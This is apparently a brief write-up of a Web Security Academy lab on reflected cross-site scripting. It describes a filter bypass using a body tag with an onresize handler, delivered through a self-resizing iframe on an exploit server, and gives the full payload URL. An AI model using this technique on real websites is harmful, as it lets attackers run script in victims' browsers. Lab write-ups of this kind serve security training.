For some reason only the `body` tag passes the filter.
The allowed attribute is `onresize`.
This should be discovered with automatic search over candidates in the cheat sheet.
To deliver the XSS to a victim, we embed it into an iframe hosted on the exploit server.
Once the iframe is loaded it will be resized to trigger `onresize`.
```
 <iframe src="https://ac421f2c1e904d1ac0d38ad8000c0052.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='42px'>
```
